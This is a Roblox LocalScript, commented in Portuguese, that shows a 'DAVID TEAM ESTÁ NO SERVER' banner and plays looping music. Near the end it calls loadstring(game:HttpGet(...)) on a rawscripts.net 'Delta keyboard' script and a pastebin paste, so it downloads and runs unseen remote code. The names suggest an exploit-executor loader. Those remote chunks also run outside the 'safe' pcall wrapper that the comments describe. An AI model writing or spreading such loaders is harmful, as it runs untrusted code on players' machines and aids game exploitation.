-- LocalScript (Roblox) - Versão com loadstring
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local SoundService = game:GetService("SoundService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ====== CONFIGURAÇÃO ======
local texto = "DAVID TEAM ESTÁ NO SERVER"

-- Música (troque pelo seu ID rbxassetid://)
local musicAssetId = "rbxassetid://1849559515" -- exemplo, troque se quiser

-- ====== EXEMPLOS DE LOADSTRINGS ======
-- Substitua essas strings pelas que você quer executar.
-- Cada string é código Lua em forma de texto.
local loadstr1 = [[
-- exemplo 1: print + criar Label rápido
print("loadstr1 executado")
local sgui = game.Players.LocalPlayer:FindFirstChild("PlayerGui")
if sgui then
    local t = Instance.new("TextLabel")
    t.Text = "LOAD 1"
    t.Size = UDim2.fromScale(0.25, 0.06)
    t.Position = UDim2.fromScale(0.5, 0.1)
    t.AnchorPoint = Vector2.new(0.5,0)
    t.BackgroundTransparency = 0.5
    t.TextScaled = true
    t.Parent = sgui
    delay(1.6, function() pcall(function() t:Destroy() end) end)
end
]]

local loadstr2 = [[
-- exemplo 2: print + mudança de volume da música (se existir)
print("loadstr2 executado")
local sound = game:GetService("SoundService"):FindFirstChild("DavidTeamMusic")
if sound then
    sound.Volume = math.clamp((sound.Volume or 0.6) + 0.1, 0, 1)
end
]]

local loadstr3 = [[
-- exemplo 3: apenas um print
print("loadstr3 executado")
]]

-- ============================

-- Cria GUI simples
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DavidTeamGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local label = Instance.new("TextLabel")
label.Size = UDim2.fromScale(0.6, 0.12)
label.Position = UDim2.fromScale(0.2, 0.44)
label.AnchorPoint = Vector2.new(0,0)
label.BackgroundTransparency = 0.25
label.BackgroundColor3 = Color3.fromRGB(10,10,10)
label.TextColor3 = Color3.fromRGB(255,255,255)
label.TextScaled = true
label.Font = Enum.Font.GothamBold
label.Text = texto
label.Parent = screenGui

-- fade out function
local function fadeOutAndDestroy(uiElement, time)
    time = time or 1
    local tweenInfo = TweenInfo.new(time, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
    local goals = {TextTransparency = 1, BackgroundTransparency = 1}
    local tween = TweenService:Create(uiElement, tweenInfo, goals)
    tween:Play()
    tween.Completed:Wait()
    pcall(function() uiElement:Destroy() end)
end

-- toca música em loop (cria Sound em SoundService)
local function playLoopMusic(assetId)
    if not assetId or assetId == "" then
        warn("Nenhum assetId de música fornecido.")
        return
    end
    -- evita criar múltiplos sons iguais
    local existing = SoundService:FindFirstChild("DavidTeamMusic")
    if existing and existing:IsA("Sound") then
        if not existing.Playing then
            pcall(function() existing:Play() end)
        end
        return existing
    end

    local sound = Instance.new("Sound")
    sound.Name = "DavidTeamMusic"
    sound.Looped = true
    sound.Volume = 0.6
    sound.SoundId = assetId
    sound.Parent = SoundService
    local ok, err = pcall(function() sound:Play() end)
    if not ok then
        warn("Não foi possível tocar a música:", err)
    end
    return sound
end

-- Executa loadstrings separados, com checagem e pcall seguro
local function executeLoadstringsSeparated(...)
    local loader = loadstring or load -- tenta loadstring, depois load
    local args = {...}
    for i = 1, #args do
        local code = args[i]
        if code and #tostring(code) > 0 then
            if not loader then
                warn(("loadstring/load não disponível — não foi possível executar loadstr%d"):format(i))
            else
                local ok, compiledOrErr = pcall(function() return loader(code) end)
                if not ok or not compiledOrErr then
                    warn(("Falha ao compilar loadstr%d: %s"):format(i, tostring(compiledOrErr)))
                else
                    -- tenta executar o chunk compilado
                    local ok2, err2 = pcall(function() compiledOrErr() end)
                    if not ok2 then
                        warn(("Erro ao executar loadstr%d: %s"):format(i, tostring(err2)))
                    end
                end
            end
        end
    end
end

-- Se você quiser juntar tudo num só loadstring, use isso:
local function executeLoadstringsCombined(...)
    local parts = {...}
    local combined = table.concat(parts, "\n")
    local loader = loadstring or load
    if not loader then
        warn("loadstring/load não disponível — não foi possível executar combined loadstring")
        return
    end
    local ok, compiledOrErr = pcall(function() return loader(combined) end)
    if not ok or not compiledOrErr then
        warn("Falha ao compilar combined loadstring:", compiledOrErr)
    else
        local ok2, err2 = pcall(function() compiledOrErr() end)
        if not ok2 then warn("Erro ao executar combined loadstring:", err2) end
    end
end

-- Sequência: mostrar -> esperar -> fade -> tocar música -> executar loadstrings
spawn(function()
    wait(0.25)
    wait(2) -- texto visível por 2s (mude se quiser)
    fadeOutAndDestroy(label, 0.8)
    playLoopMusic(musicAssetId)

    -- EXECUÇÃO: aqui eu executo os 3 loadstrings separados (recomendado)
    executeLoadstringsSeparated(loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Delta-keyboard-49109"))(), loadstring(game:HttpGet("https://pastebin.com/raw/qC7MUFRJ"))(), loadstr3)

    -- se preferir executar tudo junto, comente a linha acima e descomente a linha abaixo:
    -- executeLoadstringsCombined(loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Delta-keyboard-49109"))(), loadstring(game:HttpGet("https://pastebin.com/raw/qC7MUFRJ"))(), loadstr3)
end)